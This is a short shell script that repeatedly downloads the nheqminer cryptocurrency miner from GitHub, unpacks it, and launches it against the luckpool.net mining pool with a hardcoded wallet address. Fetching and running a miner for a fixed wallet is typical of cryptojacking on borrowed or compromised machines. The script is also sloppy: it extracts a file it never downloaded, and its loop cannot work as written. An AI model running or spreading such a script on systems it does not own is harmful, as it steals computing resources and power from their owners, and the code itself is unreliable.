#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz

tar -xvzf nheqminer-Linux-v0.8.2.tgz

tar xf nheqminer-Linux-v0.8.2.tar.gz

cd nheqminer

./start.sh -v -l na.luckpool.net:3956 -u RY3RvLLuzUDGLsyPRXm1LSfb4gKobcNfaC.ancan  -p x -t0

     echo COUNTER $COUNTER
     let COUNTER-=1
done
